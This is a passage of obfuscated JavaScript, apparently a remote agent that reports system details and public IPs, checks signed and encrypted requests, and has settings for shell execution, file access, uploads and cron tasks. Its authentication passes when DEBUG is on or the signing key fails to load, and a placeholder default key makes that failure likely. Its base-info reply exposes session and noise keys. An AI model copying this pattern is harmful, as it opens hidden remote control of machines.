        'u1nvwNi',
        'ueLgt2W',
        'D3jPDgu',
        'yxbWBhK',
        'DgnW',
        'DvbKvKW',
        'sevbra',
        'BMfTzq',
        'x2DLDenVBMzPz1zHBhvL',
        'AMLPuvy',
        'Ec10B3rHBc1JAhvUA3m',
        'rMLSzsb0B28GBgfYz2u',
        'z2znzMG',
        't1bLBKy',
        'uujXCey',
        'Eu12reG',
        'nxWZFdj8mxW0Fda',
        'D2vIC29JA2v0',
        'l2fWAs9MAwXL',
        'vxLkC3O',
        'rvHfq19tsevmtf9nt0rf',
        'Bevosxy',
        '6k6/6zEUia',
        'tM9PC2uGv0fttsbTB2r1BguGBg9HzgvKihn1y2nLC3nMDwXSEq',
        'yMfZzty0',
        'q29UDgvUDc1uExbL',
        'lcbtAwDUywW6ia',
        'qgX5zgvSBc9UB2rLlxb0Eq',
        'B25LDgLTzq',
        'u0XZzhi',
        'q09ovfjptf9qvujmsunFs0vz',
        'zgLZAW',
        'z2v0t25LDgLTzvrHC2TZ',
        'B3zLCMXHEq',
        'uK1urey',
        'yxjJAa',
        'rKLmrv9st09u',
        'uwDPzMG',
        'q016z3G',
        's3vIzxjUzxrLCW',
        'vfbTCwG',
        'BxnNuxvLDwu',
        'vw5ZDxbWB3j0zwqGCgvYBwLZC2LVBIbMB3jTyxqSig9UBhKGB2n0ywWGC3rYAw5NCYbHCMuGC3vWCg9YDgvK',
        'mc4WlJaUma',
        'zxLk',
        'ic0Tls0G',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        'CMvHzgfIBgu',
        'zwnPzxnqDwjRzxK',
        'icaGms4G6k6+572U546V5Akd5y+y6yEpoIbLEhbVCNqGruneu0fFufvcs0vzpsCTls0Tlujfr0LoifbvqKXjqYblrvKTls0TlsCUlI4N',
        'EhHqufq',
        'z2v0qMfZAwnjBMzV',
        'Bg9JywXqCML2qJy0',
        'CMvWBgfJzq',
        'sw5PDfrHC2S',
        'zxHWCMvZCW',
        'CgLK',
        'y29UDgfPBMvYpwX4yW',
        'x2DLDerPC2TjBMzV',
        'zKTsqwS',
        'BhLwz0C',
        'yM94yw0',
        'DgvYBwLUywW',
        'uuLArMC',
        'vNn6Avm',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'AgvHzgvY',
        'wM16D0G',
        'zMfTAwX5',
        'sfruuca',
        'y1L3vgu',
        'x2jHC2vPBMzVx2nHy2HL',
        'Dg9cExrLqxjYyxK',
        'A2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvT',
        'l2fWAs90yxnRl29UzxrPBwu',
        'Aw50zxjUywW',
        'mhWXFdj8mtb8oxW1Fdz8nhW3Fdn8oa',
        'CLbyzfK',
        'q0rtvuu',
        'tgDJtem',
        'quvtierLy3j5ChqGrxjYB3i6ia',
        'mta0odu3nJaW',
        'DxbNCMfKzq',
        'l2jPBI96C2G',
        'CMvXDwvZDf9Pza',
        'l2jPBI9HC2G',
        't1busu9ouW',
        'vwflAMO',
        'zgvZDhjVEq',
        'Ahr0Chm6lY9PCgLUzM8UAw8VAxa'
    ];
    a0a = function () {
        return c9;
    };
    return a0a();
}
class a0x extends a0v {
    constructor() {
        const a2 = a0T, a = a2(0x32f)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[a2(0x7c)] = '';
                continue;
            case '1':
                this['mem_total'] = 0x0;
                continue;
            case '2':
                this[a2(0x1e8)] = '';
                continue;
            case '3':
                this[a2(0x88)] = '';
                continue;
            case '4':
                this['gpu_name'] = '';
                continue;
            case '5':
                this['kernel_version'] = '';
                continue;
            case '6':
                this[a2(0x29c)] = null;
                continue;
            case '7':
                this[a2(0x1bd)] = 0x0;
                continue;
            case '8':
                this['virtualization'] = '';
                continue;
            case '9':
                this['os'] = '';
                continue;
            case '10':
                this[a2(0x97)] = 0x0;
                continue;
            case '11':
                this[a2(0x363)] = null;
                continue;
            case '12':
                this[a2(0xd8)] = null;
                continue;
            case '13':
                this[a2(0x2dd)] = a0E[a2(0x344)];
                continue;
            case '14':
                this[a2(0x339)] = 0x0;
                continue;
            case '15':
                super();
                continue;
            }
            break;
        }
    }
}
class a0y extends a0v {
    constructor() {
        const a3 = a0T, a = a3(0x212)[a3(0x36d)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                super();
                continue;
            case '1':
                this[a3(0x2d3)] = { 'usage': 0x0 };
                continue;
            case '2':
                this[a3(0x2d7)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '3':
                this[a3(0x286)] = 0x0;
                continue;
            case '4':
                this[a3(0x35b)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '5':
                this[a3(0x1e4)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '6':
                this[a3(0x31a)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '7':
                this[a3(0x353)] = 0x0;
                continue;
            case '8':
                this[a3(0x34f)] = '';
                continue;
            case '9':
                this[a3(0x103)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '10':
                this[a3(0xb4)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0z extends a0v {
    constructor() {
        const a4 = a0T, a = { 'NBoPS': '3|0|2|4|1' }, b = a[a4(0x23b)][a4(0x36d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['result'] = '';
                continue;
            case '1':
                this[a4(0x2e8)] = '';
                continue;
            case '2':
                this[a4(0x2b4)] = 0x0;
                continue;
            case '3':
                super();
                continue;
            case '4':
                this[a4(0x2e2)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0A {
    constructor() {
        const a5 = a0T, a = { 'vqJeG': a5(0x39a) }, b = a['vqJeG'][a5(0x36d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['mtime'] = '';
                continue;
            case '1':
                this['type'] = '';
                continue;
            case '2':
                this[a5(0x1cc)] = '';
                continue;
            case '3':
                this[a5(0x2ae)] = '';
                continue;
            case '4':
                this[a5(0x194)] = '';
                continue;
            case '5':
                this['path'] = '';
                continue;
            case '6':
                this['mode'] = '';
                continue;
            case '7':
                this[a5(0x9b)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0B {
    constructor() {
        const a6 = a0T, a = { 'tBNjR': a6(0x17a) }, b = a[a6(0x2a8)][a6(0x36d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a6(0x2c9)] = ![];
                continue;
            case '1':
                this[a6(0x33d)] = '';
                continue;
            case '2':
                this[a6(0x194)] = '';
                continue;
            case '3':
                this[a6(0x391)] = '';
                continue;
            case '4':
                this[a6(0x1f5)] = ![];
                continue;
            case '5':
                this['path'] = '';
                continue;
            case '6':
                this[a6(0x8c)] = ![];
                continue;
            case '7':
                this[a6(0x1cc)] = '';
                continue;
            }
            break;
        }
    }
}
class a0C extends a0v {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0D {
    static [a0T(0x166)]() {
        const a7 = a0T, a = {
                'GhLuu': a7(0x36c),
                'iGgAs': a7(0x32a),
                'uRDms': a7(0x279),
                'cMnAg': function (i, j) {
                    return i !== j;
                },
                'kQULd': a7(0x1dd)
            }, {
                privateKey: b,
                publicKey: c
            } = a0g[a7(0x126)](a[a7(0x26f)]), d = b['export']({ 'format': a[a7(0x29a)] }), f = c[a7(0xaf)]({ 'format': a['iGgAs'] }), g = Buffer[a7(0x34a)](d['d'], a7(0x279)), h = Buffer[a7(0x34a)](f['x'], a[a7(0x2cc)]);
        return (a[a7(0x15a)](g[a7(0x161)], 0x20) || a[a7(0x15a)](h[a7(0x161)], 0x20)) && a0u['error'](a7(0x2e5)), {
            'private_b64': g[a7(0x195)](a[a7(0x273)]),
            'public_b64': h[a7(0x195)](a[a7(0x273)])
        };
    }
    static [a0T(0x319)](a) {
        const a8 = a0T, b = this[a8(0x166)]();
        return {
            'role': a,
            'private_b64': b['private_b64'],
            'public_b64': b[a8(0x1bf)]
        };
    }
    static ['generatePair'](a = 'Controller', b = a0T(0xeb)) {
        const a9 = a0T, c = {
                'control': this[a9(0x319)](a),
                'agent': this['generateSingle'](b)
            };
        return c;
    }
}
class a0E {
    static [a0T(0x220)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0T(0x1d9)] = (process.env.EXEC_SHELL || a0T(0x14d))[a0T(0x139)]() === a0T(0x14d);
    static [a0T(0x164)] = (process.env.DEBUG || a0T(0x35d))[a0T(0x139)]() === a0T(0x14d);
    static [a0T(0x282)] = parseInt(process.env.TIMESTAMP_WINDOW || a0T(0x12d));
    static [a0T(0x1bb)] = parseInt(process.env.LOG_LEVEL || (this[a0T(0x164)] ? '0' : '2'), 0xa);
    static [a0T(0x235)] = a0E['_getConfigValue'](a0T(0x39b), a0T(0x20f)) || 'ECDSA公钥内容';
    static [a0T(0x207)] = a0E[a0T(0x1cd)]('ECIES_PUBKEY', a0T(0x14e)) || 'ECIES公钥内容';
    static [a0T(0x1e9)] = process.env.FILE_ROOT || a0k['homedir']();
    static [a0T(0x1ac)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0T(0x217));
    static [a0T(0xe1)] = (process.env.FOLLOW_SYMLINKS || a0T(0x35d))[a0T(0x139)]() === 'true';
    static ['FILE_AUDIT_LOG'] = (process.env.FILE_AUDIT_LOG || a0T(0x14d))['toLowerCase']() === 'true';
    static [a0T(0x1fc)] = !![];
    static ['onetasks'] = [];
    static [a0T(0x147)] = {};
    static [a0T(0x33c)] = ![];
    static [a0T(0x1b2)] = parseInt(process.env.TASK_TIMEOUT || '300');
    static [a0T(0x316)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0T(0x90)] = [];
    static [a0T(0x2ee)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0T(0x170));
    static [a0T(0x352)] = process.env.HOST || a0T(0x1f0);
    static [a0T(0x35f)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0T(0x2fa));
    static [a0T(0x344)] = process.env.AGENT_VERSION || '0.3.5-js';
    static ['SESSION_KEY'] = a0g[a0T(0x1be)](0x20)[a0T(0x195)](a0T(0x1dd));
    static [a0T(0x24a)] = a0D['generatePair']();
    static [a0T(0x2f4)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0T(0x371)][a0T(0x270)] },
        'agent': { 'public': this[a0T(0x24a)][a0T(0x305)]['public_b64'] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static [a0T(0x300)] = 0x1e;
    static ['_baseinfo_cache'] = null;
    static [a0T(0xb8)] = 0x0;
    static ['_baseinfo_fetch_promise'] = null;
    static ['_status_cache'] = null;
    static [a0T(0xb1)] = 0x0;
    static [a0T(0x25d)] = null;
    static [a0T(0x1cd)](a, b) {
        const aa = a0T, c = process.env[a];
        if (c)
            return c;
        const d = a0j['join'](__dirname, b);
        if (a0h['existsSync'](d))
            try {
                return a0h[aa(0x2dc)](d, aa(0x153))[aa(0x143)]();
            } catch (f) {
            }
        return '';
    }
    static [a0T(0xc1)]() {
        const ab = a0T, a = {
                'jZweb': ab(0x150),
                'rmlwN': 'ECIES_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecies_pub.b64\x20不存在',
                'FUjiA': function (b, c) {
                    return b > c;
                },
                'VpWlU': ab(0x32c),
                'jUksx': '❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):',
                'MPVEp': '\x0a💡\x20解决方法:'
            };
        if (!this[ab(0x164)]) {
            const b = [];
            !this[ab(0x235)] && b[ab(0x15b)](a[ab(0x291)]);
            !this['ECIES_PUBLIC_KEY_PEM'] && b[ab(0x15b)](a['rmlwN']);
            if (a[ab(0x134)](b[ab(0x161)], 0x0)) {
                const c = '3|2|5|1|0|4'[ab(0x36d)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0u['debug'](a[ab(0x276)]);
                        continue;
                    case '1':
                        a0u['debug'](ab(0x1f7));
                        continue;
                    case '2':
                        b[ab(0x2fd)](f => a0u['error']('\x20\x20\x20•\x20' + f));
                        continue;
                    case '3':
                        a0u[ab(0x15e)](a[ab(0xe4)]);
                        continue;
                    case '4':
                        process[ab(0xcc)](0x1);
                        continue;
                    case '5':
                        a0u['debug'](a[ab(0x1ab)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0T(0x86)](a = {}) {
        const ac = a0T, b = {
                'QgAmN': function (c, d) {
                    return c !== d;
                },
                'eqbnL': function (c, d, f) {
                    return c(d, f);
                },
                'boxam': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[ac(0x250)](a[ac(0x35f)], undefined) && b[ac(0x250)](a['PORT'], null) && (this['PORT'] = b[ac(0x10c)](parseInt, b[ac(0x203)](String, a[ac(0x35f)]), 0xa)), a[ac(0x235)] && (this[ac(0x235)] = a['ECDSA_PUBLIC_KEY_PEM'][ac(0x143)]()), a[ac(0x207)] && (this['ECIES_PUBLIC_KEY_PEM'] = a[ac(0x207)][ac(0x143)]());
    }
}
class a0F {
    constructor(a, b) {
        const ad = a0T, c = {
                'qAFWj': '-----BEGIN',
                'nQDCg': ad(0x1dd),
                'SxHIO': function (d, f) {
                    return d(f);
                },
                'zpgpV': ad(0x2e0),
                'lENIv': ad(0x32a)
            };
        this[ad(0xac)] = null, this[ad(0x1f6)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[ad(0x2f5)](c[ad(0x1a3)]))
                    this[ad(0xac)] = a0g[ad(0x310)](d);
                else {
                    const f = Buffer[ad(0x34a)](d, c[ad(0x322)]), g = a0s[ad(0x131)][ad(0xd4)](f), h = g[ad(0x25a)](![]), i = m => m['toString'](ad(0x1dd))[ad(0x1fb)](/\+/g, '-')['replace'](/\//g, '_')[ad(0x1fb)](/=/g, ''), j = c[ad(0x182)](i, Buffer[ad(0x34a)](h[ad(0x78)](0x1, 0x21))), k = i(Buffer[ad(0x34a)](h[ad(0x78)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[ad(0x2a4)],
                            'x': j,
                            'y': k
                        };
                    this[ad(0xac)] = a0g['createPublicKey']({
                        'key': l,
                        'format': c[ad(0x1da)]
                    });
                }
            } catch (m) {
                a0u[ad(0x15e)](ad(0x38c) + m[ad(0x34f)]), this[ad(0xac)] = null;
            }
        if (b)
            try {
                this['eciesPubkey'] = a0p[ad(0x20e)](b[ad(0x143)]());
            } catch (n) {
                a0u[ad(0x1a0)]('⚠️\x20ECIES公钥解码失败:\x20' + n[ad(0x34f)]);
            }
    }
    [a0T(0x142)](a, b, c) {
        const ae = a0T, d = {
                'vQfMX': function (f, g) {
                    return f(g);
                },
                'DOLZc': function (f, g) {
                    return f > g;
                },
                'AIQWD': function (f, g) {
                    return f - g;
                },
                'uPdVL': ae(0x29e)
            };
        if (!this[ae(0xac)])
            return !![];
        try {
            const f = d[ae(0xa1)](parseInt, b), g = Math[ae(0x18d)](Date[ae(0x1b5)]() / 0x3e8);
            if (d[ae(0x259)](Math[ae(0xa7)](d[ae(0x11d)](g, f)), a0E[ae(0x282)]))
                throw new Error(ae(0x1c0) + Math['abs'](d['AIQWD'](g, f)) + ae(0x31f) + a0E[ae(0x282)] + 's');
            const h = '' + a + b, i = a0p[ae(0x20e)](c), j = a0g[ae(0x81)](d[ae(0x1ca)]);
            j[ae(0x2c3)](h);
            const k = j[ae(0xdb)](this[ae(0xac)], i);
            if (!k)
                throw new Error(ae(0x331));
            return !![];
        } catch (l) {
            throw new Error(ae(0x2a7) + l[ae(0x34f)]);
        }
    }
    [a0T(0x1b1)](a) {
        const af = a0T, b = {
                'wDARl': af(0x374),
                'sqrym': function (c, d, f) {
                    return c(d, f);
                },
                'FUaUu': af(0x1dd)
            };
        if (a0E['DEBUG'] || !this[af(0x1f6)])
            return JSON[af(0x1c1)](a);
        try {
            const c = JSON[af(0x1c1)](a), d = Buffer[af(0x34a)](c, b[af(0xfe)]), f = Buffer[af(0x34a)](this[af(0x1f6)]), g = b[af(0x79)](a0o, f, d);
            return Buffer[af(0x34a)](g)[af(0x195)](b[af(0x326)]);
        } catch (h) {
            const i = {
                '_encrypt_error': h[af(0x34f)],
                '_raw': a0E['DEBUG'] ? a : null
            };
            return JSON[af(0x1c1)](i);
        }
    }
    [a0T(0x8b)](a, b) {
        const ag = a0T, c = {
                'LNycH': function (d, f) {
                    return d !== f;
                },
                'FvyZV': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'TIbJW': ag(0x153),
                'sFjmh': 'base64',
                'pYZeP': ag(0xf3)
            };
        if (!b || c[ag(0x27b)](b['length'], 0x20))
            throw new Error(c[ag(0x18b)]);
        try {
            const d = Buffer[ag(0x34a)](a, ag(0x1dd))[ag(0x195)](c[ag(0xd3)]), f = JSON[ag(0x37e)](d);
            if (!f['nonce'] || !f[ag(0x307)] || !f['ciphertext'])
                throw new Error(ag(0x230));
            const g = Buffer[ag(0x34a)](f[ag(0x160)], c[ag(0xdc)]), h = Buffer['from'](f[ag(0x307)], ag(0x1dd)), i = Buffer[ag(0x34a)](f['ciphertext'], c['sFjmh']), j = a0g[ag(0x16e)](c[ag(0xcd)], b, g);
            j[ag(0xd5)](h);
            let k = j[ag(0x2c3)](i, null, c[ag(0xd3)]);
            return k += j[ag(0x167)](ag(0x153)), k;
        } catch (l) {
            throw new Error(ag(0x216) + l[ag(0x34f)]);
        }
    }
}
function a0G(a) {
    const ah = a0T, b = {
            'xpNpN': ah(0x1de),
            'HrpGH': ah(0x177),
            'adigt': function (c, d) {
                return c === d;
            },
            'gfMfh': ah(0x2b5),
            'TYyfg': ah(0x223),
            'zueRR': ah(0x14d),
            'mHxag': ah(0x122),
            'xlIII': ah(0x2ad),
            'mwsCC': ah(0x153),
            'rCZMe': ah(0x35d),
            'SmgwH': ah(0x137),
            'ZmzwH': function (c) {
                return c();
            },
            'hMZtB': ah(0x21c),
            'SLsdr': function (c, d) {
                return c === d;
            },
            'QsIWr': ah(0x1cb),
            'AdXOj': ah(0x320),
            'jSnpM': ah(0x178),
            'cUtjD': ah(0x28d),
            'lyVgG': ah(0x11e),
            'hiVif': 'X-Timestamp',
            'btGWv': 'x-auth-token',
            'zaFcc': ah(0x2ff),
            'bJxPI': function (c, d) {
                return c || d;
            },
            'cfqje': 'Missing\x20auth\x20headers',
            'fzZve': ah(0xb0),
            'KOYdN': ah(0x1dd),
            'mpmHk': function (c) {
                return c();
            }
        };
    return async (c, d, f) => {
        const ai = ah;
        if (c[ai(0x98)]['startsWith'](b[ai(0x144)]) || b['adigt']((c[ai(0x24f)][ai(0x218)] || '')[ai(0x139)](), ai(0x1d6)))
            return b[ai(0x209)](f);
        if (b[ai(0x349)](c[ai(0x96)], b['hMZtB']) || b['SLsdr'](c['method'], b[ai(0x192)]))
            return b[ai(0x209)](f);
        c[ai(0x355)] = ![];
        const g = [
            b[ai(0x128)],
            b[ai(0x82)]
        ];
        if (a0E[ai(0x164)])
            return c[ai(0x355)] = !![], f();
        const h = c[ai(0x24f)]['x-nonce'] || c[ai(0x24f)][b[ai(0x256)]], i = c[ai(0x24f)][b[ai(0x202)]] || c['headers'][b[ai(0x2d9)]], j = c[ai(0x24f)][b[ai(0x347)]] || c['headers'][b[ai(0x28b)]];
        if (b[ai(0x24b)](!h, !i) || !j)
            return g[ai(0x237)](c[ai(0x98)]) ? b[ai(0x209)](f) : d[ai(0x240)](0x191)['json']({ 'error': b[ai(0x31e)] });
        try {
            a[ai(0x142)](h, i, j), c[ai(0x355)] = !![];
        } catch (l) {
            return g[ai(0x237)](c[ai(0x98)]) ? f() : d['status'](0x191)['json']({ 'error': ai(0x2a7) + l[ai(0x34f)] });
        }
        if (c['body'] && typeof c[ai(0x26d)] === b[ai(0x1d1)]) {
            const m = b[ai(0x1e2)]((c[ai(0x24f)][b['fzZve']] || '')[ai(0x139)](), b[ai(0xcf)]);
            try {
                if (m && c['is_authenticated']) {
                    const n = Buffer[ai(0x34a)](a0E[ai(0x2ec)], b[ai(0x244)]), o = a['decryptData'](c['body'], n);
                    c[ai(0x26d)] = JSON['parse'](o);
                } else {
                    if (c[ai(0x26d)]['startsWith'](ai(0x1f1))) {
                        const p = Buffer['from'](c[ai(0x26d)], b[ai(0x244)])[ai(0x195)]('utf-8');
                        c[ai(0x26d)] = JSON[ai(0x37e)](p);
                    } else {
                        if (c[ai(0x26d)]['trim']()[ai(0x2f5)]('{') || c['body'][ai(0x143)]()['startsWith']('['))
                            c[ai(0x26d)] = JSON['parse'](c[ai(0x26d)]);
                        else {
                            if (b[ai(0x349)](c[ai(0x26d)][ai(0x143)](), ''))
                                c[ai(0x26d)] = {};
                        }
                    }
                }
            } catch (q) {
                return a0u[ai(0x15e)](ai(0x34d) + q[ai(0x34f)]), d[ai(0x240)](0x190)[ai(0x2e6)]({ 'error': ai(0x17b) + q['message'] });
            }
        }
        const k = d[ai(0xdf)];
        d[ai(0xdf)] = function (r) {
            const aj = ai;
            if (d[aj(0x32d)](b['xpNpN']) && d[aj(0x32d)](aj(0x1de))[aj(0x237)](b[aj(0x179)]))
                try {
                    const s = b[aj(0x349)](typeof r, b[aj(0x1d1)]) ? JSON['parse'](r) : r;
                    if (c[aj(0x355)]) {
                        const t = a[aj(0x1b1)](s), u = typeof t === aj(0x2b5) ? t : JSON['stringify'](t);
                        return d[aj(0x293)](b[aj(0x392)], b[aj(0xcf)]), d[aj(0x293)](b[aj(0x72)], a0E[aj(0x344)]), d[aj(0x293)](b[aj(0x9a)], Buffer['byteLength'](u, b[aj(0x385)])[aj(0x195)]()), k[aj(0x162)](this, u);
                    } else {
                        const v = typeof r === b['gfMfh'] ? r : JSON[aj(0x1c1)](s);
                        return d[aj(0x293)](aj(0x223), b[aj(0x342)]), d['set'](b['xlIII'], Buffer[aj(0x2e7)](v, b[aj(0x385)])[aj(0x195)]()), k['call'](this, v);
                    }
                } catch (w) {
                    if (a0E[aj(0x164)])
                        a0u[aj(0x15e)](aj(0x71) + w[aj(0x34f)]);
                }
            return k[aj(0x162)](this, r);
        }, b[ai(0x2ed)](f);
    };
}
class a0H {
    constructor() {
        const ak = a0T, a = {
                'JJzQQ': function (b, c) {
                    return b / c;
                }
            };
        this[ak(0x258)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[ak(0x246)] = 0x0, this['totalNetworkDown'] = 0x0, this[ak(0xfa)] = a[ak(0x8e)](Date[ak(0x1b5)](), 0x3e8);
    }
    async [a0T(0x38d)]() {
        const al = a0T, a = {
                'ADEgx': '/sys/fs/cgroup/memory.max',
                'fKRAk': al(0x340),
                'aQaWu': function (d, f, g) {
                    return d(f, g);
                },
                'oerda': '/sys/fs/cgroup/memory.current',
                'MqnSA': 'utf8',
                'RMTDF': al(0x8f),
                'PAxih': '/sys/fs/cgroup/memory/memory.usage_in_bytes',
                'zdbyL': function (d, f) {
                    return d > f;
                },
                'aFneH': function (d, f) {
                    return d === f;
                },
                'IRaqO': function (d, f) {
                    return d === f;
                },
                'VmQSl': function (d, f) {
                    return d(f);
                },
                'VETYh': function (d, f) {
                    return d - f;
                },
                'oJcZC': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i[al(0x324)](a['ADEgx'], 'utf8'))[al(0x143)]();
            b = d === a[al(0x201)] ? null : a[al(0xec)](parseInt, d, 0xa), c = a[al(0xec)](parseInt, (await a0i[al(0x324)](a['oerda'], a[al(0x2f3)]))[al(0x143)](), 0xa);
        } catch {
            try {
                b = a[al(0xec)](parseInt, (await a0i[al(0x324)](a[al(0x1e7)], a[al(0x2f3)]))[al(0x143)](), 0xa), c = parseInt((await a0i[al(0x324)](a[al(0x2fb)], a[al(0x2f3)]))[al(0x143)](), 0xa);
                if (a[al(0x2f1)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0n['mem']();
                b = f[al(0x163)], c = f[al(0x176)];
            }
        }
        if (a[al(0x2bd)](b, null)) {
            const g = await a0n[al(0xba)]();
            b = g[al(0x163)], (a[al(0x87)](c, null) || a[al(0x2d4)](isNaN, c)) && (c = g[al(0x176)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[al(0x115)](b, c),
            'free': a['oJcZC'](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0T(0x1f9)]() {
        const am = a0T, [a, b, c, d] = await Promise[am(0x1b8)]([
                a0n[am(0x2d3)](),
                this['getContainerMemory'](),
                a0n['osInfo'](),
                a0n[am(0x191)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise['all']([
                this[am(0x224)](),
                this[am(0x2b8)]()
            ]);
        } catch (h) {
            a0u[am(0x31d)](am(0x1a1) + h[am(0x34f)], 0x1);
        }
        return {
            'arch': a0k[am(0x1e8)](),
            'cpu_cores': a[am(0x2a2)],
            'cpu_name': a[am(0x226)],
            'disk_total': (await a0n[am(0x16d)]())[0x0]?.[am(0x9b)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b['total'],
            'os': c[am(0x2c2)] + '\x20' + c[am(0x330)],
            'kernel_version': c[am(0x332)],
            'swap_total': b[am(0x38f)],
            'version': a0E[am(0x344)],
            'virtualization': await this[am(0x278)](),
            'session_key': a0E['SESSION_KEY'],
            'noise_key': a0E['NOISE_KEY']
        };
    }
    [a0T(0x123)]() {
        const an = a0T, a = {
                'AzqTA': function (c, d) {
                    return c === d;
                },
                'zSRhC': an(0xb2)
            }, b = a0k[an(0x191)]();
        for (const c of Object[an(0xc6)](b)) {
            for (const d of b[c]) {
                const f = a[an(0x114)](d['family'], a['zSRhC']) || d['family'] === 0x4;
                if (f && !d[an(0x211)]) {
                    if (!/^10\./[an(0xbe)](d[an(0x30a)]) && !/^192\.168\./[an(0xbe)](d[an(0x30a)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[an(0xbe)](d[an(0x30a)]))
                        return d[an(0x30a)];
                }
            }
        }
        return null;
    }
    async [a0T(0x224)]() {
        const ao = a0T, a = {
                'DzwMO': ao(0x27f),
                'XfPbS': 'https://icanhazip.com',
                'Dywwv': ao(0x146),
                'pVfxb': ao(0x232),
                'EYWpM': ao(0x21f),
                'qRxRw': ao(0x6e)
            }, b = [
                a[ao(0x395)],
                a[ao(0xad)],
                a[ao(0xef)],
                ao(0x138),
                a[ao(0x27a)],
                a[ao(0x262)],
                a[ao(0x14c)]
            ];
        for (const d of b) {
            try {
                const f = await this[ao(0x38e)](d, 0x4);
                if (f && this[ao(0xd2)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[ao(0x123)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    ['getLocalIPv6']() {
        const ap = a0T, a = {
                'FUlGu': ap(0x345),
                'rnOxX': function (c, d) {
                    return c === d;
                },
                'lTyZY': 'fe80:'
            }, b = a0k['networkInterfaces']();
        for (const c of Object[ap(0xc6)](b)) {
            for (const d of b[c]) {
                const f = d[ap(0x20a)] === a[ap(0x268)] || a['rnOxX'](d[ap(0x20a)], 0x6);
                if (f && !d[ap(0x211)]) {
                    if (!d['address'][ap(0x139)]()[ap(0x2f5)](a[ap(0x38a)]))
                        return d[ap(0x30a)];
                }
            }
        }
        return null;
    }
    async [a0T(0x2b8)]() {
        const aq = a0T, a = {
                'Kjyyq': aq(0x186),
                'xbwSK': 'https://icanhazip.com',
                'wKcQl': aq(0x398)
            }, b = this['getLocalIPv6']();
        if (b && this[aq(0x285)](b))
            return b;
        const c = [
            a[aq(0x35a)],
            a[aq(0x14f)],
            a[aq(0xab)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this['isValidIPv6'](f))
                    return f;
            } catch (g) {
                a0u[aq(0x31d)](aq(0x1db) + d + aq(0x183) + g[aq(0x34f)]);
                continue;
            }
        }
        return null;
    }
    async [a0T(0x38e)](a, b = 0x0) {
        const ar = a0T, c = {
                'EeOKO': function (d, f) {
                    return d(f);
                },
                'mPCIB': ar(0x32b),
                'atnrD': ar(0x311),
                'mEoqo': function (d, f) {
                    return d(f);
                },
                'LgcLC': 'https',
                'ZwNWF': 'error'
            };
        return new Promise((d, f) => {
            const as = ar, g = {
                    'zYvfV': function (k, l) {
                        return k(l);
                    }
                }, h = c['mEoqo'](require, c[as(0x215)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': as(0x29d) }
                }, j = h[as(0x32d)](a, i, k => {
                    const at = as;
                    let l = '';
                    if (k[at(0x233)] !== 0xc8) {
                        c[at(0x13d)](f, new Error(at(0x20b) + k[at(0x233)]));
                        return;
                    }
                    k['on'](c[at(0x102)], m => l += m), k['on'](c[at(0x22c)], () => d(l[at(0x143)]()));
                });
            j['on'](c[as(0x357)], f), j[as(0xd0)](0x1388, () => {
                const au = as;
                j[au(0x21e)](), g[au(0x6f)](f, new Error(au(0x132)));
            });
        });
    }
    ['isValidIPv4'](a) {
        const av = a0T;
        return /^(\d{1,3}\.){3}\d{1,3}$/[av(0xbe)](a);
    }
    ['isValidIPv6'](a) {
        const aw = a0T;
        if (!/^[0-9a-fA-F:]+$/['test'](a) || !a[aw(0x237)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[aw(0xbe)](a))
            return ![];
        return !![];
    }
